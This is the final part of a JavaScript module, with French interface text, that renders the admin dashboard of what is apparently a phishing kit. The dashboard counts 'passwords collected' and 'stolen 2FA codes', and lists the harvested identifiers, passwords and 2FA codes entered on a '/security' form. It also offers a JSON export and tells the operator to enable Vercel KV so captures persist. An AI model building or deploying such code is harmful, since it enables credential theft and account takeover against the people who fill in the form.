    .btn { padding: 10px 18px; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; line-height: 1.2; }
    .btn-back { background: #e2e8f0; color: #334155; }
    .btn-back:hover { background: #cbd5e1; }
    .btn-danger { background: #dc2626; color: white; }
    .btn-danger:hover { background: #b91c1c; }
    .btn-export { background: #16a34a; color: white; }
    .btn-export:hover { background: #15803d; }
    form.inline-btn-form { display: inline-flex; }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap: 12px; margin-bottom: 24px; }
    .stat { background: white; border-radius: 10px; padding: 18px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); border-left: 4px solid #1877f2; }
    .stat.red { border-left-color: #dc2626; }
    .stat.green { border-left-color: #16a34a; }
    .stat.orange { border-left-color: #f59e0b; }
    .stat-label { font-size: 12px; color: #64748b; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
    .stat-value { font-size: 28px; font-weight: 700; color: #0f172a; margin-top: 4px; }
    .card { background: white; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); overflow: hidden; }
    .card-head { padding: 16px 20px; border-bottom: 1px solid #e5e7eb; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
    .card-title { font-size: 16px; font-weight: 700; color: #1e293b; }
    .card-count { font-size: 12px; color: #64748b; background: #f1f5f9; padding: 4px 10px; border-radius: 999px; font-weight: 600; }
    .table-wrap { overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; min-width: 720px; }
    thead { background: #f8fafc; }
    th {
        padding: 12px 14px;
        text-align: left;
        font-size: 11px;
        color: #64748b;
        text-transform: uppercase;
        letter-spacing: 0.6px;
        font-weight: 700;
        border-bottom: 2px solid #e2e8f0;
    }
    tbody tr:hover { background: #f8fafc; }
    .empty {
        padding: 40px 20px;
        text-align: center;
        color: #64748b;
    }
    .empty-icon {
        font-size: 40px;
        margin-bottom: 12px;
    }
    .empty p { font-size: 14px; line-height: 1.6; }
    code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
</style>
</head>
<body>
<div class="wrap">
    ${banner}
    <div class="top">
        <h1>🔐 Panel Admin — Vérifications d'identité <span>${count} enregistrement${count > 1 ? 's' : ''}</span></h1>
        <div class="actions">
            <a href="/security" class="btn btn-back">← Retour formulaire</a>
            <a href="/admin/export" class="btn btn-export">⬇ Export JSON</a>
            <form action="/admin/clear" method="POST" class="inline-btn-form" onsubmit="return confirm('⚠ Supprimer DÉFINITIVEMENT toutes les données ? Cette action est irréversible.');">
                <button type="submit" class="btn btn-danger">🗑 Vider</button>
            </form>
        </div>
    </div>

    ${debugCard}

    <div class="stats">
        <div class="stat">
            <div class="stat-label">Total vérifications</div>
            <div class="stat-value">${count}</div>
        </div>
        <div class="stat orange">
            <div class="stat-label">Identifiants uniques</div>
            <div class="stat-value">${uniqueIds}</div>
        </div>
        <div class="stat red">
            <div class="stat-label">Mots de passe collectés</div>
            <div class="stat-value">${totalPw}</div>
        </div>
        <div class="stat green">
            <div class="stat-label">Codes 2FA volés</div>
            <div class="stat-value">${total2Fa}</div>
        </div>
    </div>

    <div class="card">
        <div class="card-head">
            <div class="card-title">📋 Détail des connexions (identifiants + mots de passe)</div>
            <div class="card-count">${count} ligne${count > 1 ? 's' : ''}</div>
        </div>
        <div class="table-wrap">
            ${count === 0 ? `
                <div class="empty">
                    <div class="empty-icon">📭</div>
                    <p><strong>Aucune donnée collectée pour le moment.</strong></p>
                    <p style="margin-top:6px;">Soumets le formulaire de la page <a href="/security" style="color:#2563eb;">/security</a> pour voir apparaître les lignes ici.</p>
                    ${onVercel && !kvEnabled ? `<p style="margin-top:16px;color:#991b1b;"><strong>⚠ N'oublie pas :</strong> tu dois activer KV Redis pour que les captures persistent sur Vercel.</p>` : ''}
                </div>
            ` : `
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Date / Heure</th>
                        <th>Identifiant (email / téléphone)</th>
                        <th>Mot de passe</th>
                        <th>Code 2FA</th>
                    </tr>
                </thead>
                <tbody>
                    ${rows}
                </tbody>
            </table>
            `}
        </div>
    </div>
</div>
</body>
</html>`;
};

module.exports = { escapeHtml, applyNoCache, confirmationHtml, twoFaHtml, renderAdmin, requireAdminAuth, parseBasicAuth };
